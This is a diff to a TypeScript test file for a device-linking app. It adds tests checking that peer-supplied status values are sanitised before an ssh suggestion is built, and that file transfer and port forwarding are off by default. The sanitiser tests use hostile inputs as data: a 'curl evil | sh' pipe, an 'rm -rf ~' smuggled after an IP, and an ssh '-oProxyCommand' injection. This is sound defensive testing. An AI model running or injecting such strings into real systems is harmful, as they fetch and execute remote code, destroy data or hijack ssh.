@@ -6,6 +6,8 @@ import * as path from 'node:path';
 import { after, before, describe, test } from 'node:test';
 import { Core, PairPrompt } from '../main/core';
 import { sanitizeRelPath } from '../main/files';
+import { sanitizeStatus } from '../main/status';
+import { Store } from '../main/store';
 import { handshake } from '../main/protocol';
 import type { ClipboardAdapter } from '../main/clipboard';
 
@@ -34,7 +36,7 @@ function mk(name: string) {
     clipboard: clip,
     discovery: false,
     log: process.env.DL_DEBUG ? (m: string) => console.log(Date.now() % 100000, name, m) : undefined,
-    defaults: { deviceName: name, listenPort: 0, downloadsDir: path.join(tmp, name, 'dl') },
+    defaults: { deviceName: name, listenPort: 0, downloadsDir: path.join(tmp, name, 'dl'), acceptFiles: true, allowForwarding: true },
   });
   return { core, clip };
 }
@@ -187,5 +189,30 @@ describe('sanitizeRelPath', () => {
     assert.equal(sanitizeRelPath('a:b?.txt'), 'a_b_.txt');
     assert.equal(sanitizeRelPath('trailing. '), 'trailing');
     assert.equal(sanitizeRelPath('..'), 'file');
+  });
+});
+
+describe('peer-supplied status', () => {
+  test('keeps shell metacharacters and non-IPv4 addresses out of the ssh suggestion', () => {
+    const evil = sanitizeStatus({ username: 'x; curl evil | sh', ips: ['1.2.3.4; rm -rf ~', 'fe80::1%en0', '192.168.1.5', 42] });
+    assert.equal(evil.username, '');
+    assert.deepEqual(evil.ips, ['192.168.1.5']);
+    assert.equal(sanitizeStatus({ username: '-oProxyCommand=x' }).username, '');
+    assert.equal(sanitizeStatus({ username: 'jane.doe-1' }).username, 'jane.doe-1');
+  });
+  test('tolerates garbage without throwing', () => {
+    for (const raw of [null, 'x', 7, {}, { ips: 'nope', tools: 5, uptime: 'a' }]) {
+      const s = sanitizeStatus(raw);
+      assert.deepEqual(s.ips, []);
+      assert.equal(s.uptime, 0);
+    }
+  });
+});
+
+describe('defaults', () => {
+  test('a fresh install does not accept files or port forwards until the user opts in', () => {
+    const st = new Store(fs.mkdtempSync(path.join(os.tmpdir(), 'devlink-defaults-')));
+    assert.equal(st.settings.acceptFiles, false);
+    assert.equal(st.settings.allowForwarding, false);
   });
 });
